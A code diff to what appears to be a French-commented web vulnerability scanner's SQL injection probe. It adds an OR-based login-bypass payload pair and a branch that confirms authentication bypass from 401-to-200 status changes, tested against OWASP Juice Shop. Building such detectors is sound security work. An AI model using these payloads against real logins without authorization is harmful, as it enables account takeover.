@@ -306,10 +306,21 @@ _SQL_ERROR_SIGNS = [
 _DBMS_VERSION_RX = re.compile(
     r"(?i)\b(mariadb|mysql|postgresql|postgres|sqlite|oracle|microsoft sql server|mssql)\b[^\r\n]{0,40}?(\d+\.\d+(?:\.\d+)?)")
 # Paires (VRAI, FAUX) de différentiel booléen — contextes chaîne et numérique.
+# Statuts lus par le différentiel d'AUTORISATION (A-bis).
+_DENY_STATUS = (401, 403)
+_OK_STATUS = (200, 201, 202, 206)
+
 _BOOL_PAIRS = [
     ("' AND '1'='1", "' AND '1'='2"),
     (" AND 1=1", " AND 1=2"),
     ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
+    # DISJONCTIVES — indispensables au différentiel d'AUTORISATION (A-bis). Les paires ci-dessus sont
+    # toutes conjonctives : un `AND` PRÉSERVE la condition d'origine, donc un identifiant faux reste
+    # faux et la requête reste refusée. Seul un `OR` peut faire basculer un refus en succès, c'est-à-
+    # dire produire le signal d'un bypass d'authentification — le cas de SQLi à plus fort impact, et
+    # celui que ce module ne pouvait PAS voir. La variante FAUSSE garde la même forme avec une
+    # condition fausse, pour que le différentiel reste probant (et pas un simple « ça répond 200 »).
+    ("' OR '1'='1'-- -", "' OR '1'='2'-- -"),
 ]
 
 
@@ -420,6 +431,15 @@ class SqliProbe(FlagAllowlistMixin, InjectionOracle):
 
         # (A) différentiel BOOLÉEN : VRAI ~= baseline (même corps normalisé, même statut) ET FAUX ≠ VRAI.
         bool_confirmed, bool_ctx = False, ""
+        # (A-bis) DIFFÉRENTIEL D'AUTORISATION — la baseline est REFUSÉE, le payload VRAI est ACCEPTÉ,
+        # le FAUX reste refusé. C'est la forme INVERSE de (A) : le différentiel de contenu suppose
+        # « VRAI ressemble à la baseline », ce qui vaut pour un endpoint qui RETOURNE DES DONNÉES ;
+        # une injection qui bascule une DÉCISION D'AUTORISATION fait exactement le contraire — elle
+        # transforme un refus en succès. Sans cette branche, un bypass d'authentification par SQLi
+        # (le cas à plus fort impact) était rendu « SQLi non confirmé ».
+        # Mesuré sur OWASP Juice Shop, `POST /rest/user/login`, param `email` :
+        #   baseline 401/26o · VRAI 200/799o (JWT admin) · FAUX 401/26o -> (A) muet, (A-bis) confirme.
+        auth_confirmed, auth_ctx = False, ""
         for ptrue, pfalse in _BOOL_PAIRS:
             _, t_st, t_body = self._send(action, param, value + ptrue, method)
             _, f_st, f_body = self._send(action, param, value + pfalse, method)
@@ -430,6 +450,12 @@ class SqliProbe(FlagAllowlistMixin, InjectionOracle):
             if same_true and differs:
                 bool_confirmed, bool_ctx = True, ptrue.strip()
                 break
+            # PREUVE NETTE exigée : refus -> succès, ET le FAUX reproduit le refus (sinon un endpoint
+            # simplement instable, ou qui répond 200 à tout, suffirait à déclencher un faux positif).
+            if (not auth_confirmed and base_st in _DENY_STATUS
+                    and t_st in _OK_STATUS and f_st == base_st):
+                auth_confirmed = True
+                auth_ctx = f"{ptrue.strip()} ({base_st} -> {t_st}, faux={f_st})"
 
         # (B) error-based : un guillemet provoque une erreur SGBD ABSENTE de la baseline -> injection.
         #     On n'extrait QUE la version du SGBD (jamais de données). Signature déjà présente en
@@ -449,9 +475,10 @@ class SqliProbe(FlagAllowlistMixin, InjectionOracle):
                 evidence="Aucune réponse du serveur (ni baseline ni sondes booléennes/erreur) ; offline-safe.",
                 poc=self.dry(action))]
 
-        proven = bool_confirmed or error_confirmed
+        proven = bool_confirmed or error_confirmed or auth_confirmed
         tech = ", ".join(t for t in (
             ("différentiel booléen" if bool_confirmed else ""),
+            ("différentiel d'AUTORISATION (refus -> succès)" if auth_confirmed else ""),
             ("error-based (version SGBD)" if error_confirmed else "")) if t) or "aucune"
         findings = [self.proof(
             target=where, proven=proven,
@@ -459,6 +486,7 @@ class SqliProbe(FlagAllowlistMixin, InjectionOracle):
                    else "SQLi non confirmé — ni différentiel booléen ni erreur SGBD (pas de verdict aveugle)"),
             severity=("HIGH" if proven else "INFO"),
             evidence=(f"technique={tech} ; contexte_booléen={bool_ctx or '—'} ; "
+                      f"contexte_autorisation={auth_ctx or '—'} ; "
                       f"erreur_SGBD={err_sign or '—'} ; version_SGBD={err_version or '—'} "
                       f"(version seule — aucun dump de données)"),
             poc=(f"# {self._curl(where, dict(action.params.get('headers', {})), method)}\n"
